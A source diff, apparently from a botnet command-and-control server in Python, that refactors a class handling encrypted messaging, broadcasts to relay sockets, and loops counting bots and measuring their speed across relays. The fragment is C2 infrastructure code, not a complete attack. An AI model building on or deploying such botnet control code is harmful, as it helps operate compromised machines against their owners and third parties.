@@ -9,12 +9,51 @@ from .config import (
     Relay,
 )
 
-class Loops():
+class Core():
     def __init__(
         self,
         config: C2Config = C2Config(),
     ):
         self.config = config
+
+    def log(
+        self,
+        data: str,
+    ) -> None: 
+        if self.config.debug: print(data)
+
+
+    def crypt(
+        self,
+        msg: bytes,
+        encrypt: bool = True,
+    ) -> str:
+        if encrypt: msg = self.config.fernet.encrypt(msg)
+        else: msg = self.config.fernet.decrypt(msg)
+
+        return msg.decode()
+
+    def send(
+        self,
+        socket: Sock,
+        data: str,
+        escape: bool = True,
+        reset: bool = True,
+    ) -> None:
+        if reset: data += self.config.COLOR_RESET
+        if escape: data += '\r\n'
+
+        socket.send(data.encode())
+
+    def broadcast(
+        self,
+        data: str,
+    ) -> None:
+        self.log(f"send {data}")
+
+        for relay in self.config.relays_sock.keys():
+            try: self.send(relay, data, False, False)
+            except Exception: self.close_relay(relay)
 
     def edit_relay(
         self,
@@ -53,18 +92,6 @@ class Loops():
         if not self.edit_relay(relay, "update"): print("cannot update relay:", relay.ip)
         else: print("relay updated with:", relay.bots)
 
-    def send(
-        self,
-        socket: Sock,
-        data: str,
-        escape: bool = True,
-        reset: bool = True,
-    ) -> None:
-        if reset: data += self.config.COLOR_RESET
-        if escape: data += '\r\n'
-
-        socket.send(data.encode())
-
     def _ping(self) -> None:
         for relay in self.config.relays_sock.copy().keys():
             try:
@@ -88,6 +115,7 @@ class Loops():
             sleep(self.config.cnc_time.PING)
 
     def _net(self) -> None:
+        self.config.bot_speed = 0
         for relay in self.config.relays_sock.copy().keys():
             print(relay)
             try:
@@ -120,9 +148,9 @@ class Loops():
             self._net()
             sleep(self.config.cnc_time.NET)
 
-
     def _getbot(self) -> None:
         self.config.temp_relays.clear()
+        self.config.bot_count = 0
 
         for relay in self.config.relays_sock.copy().keys():
             try:
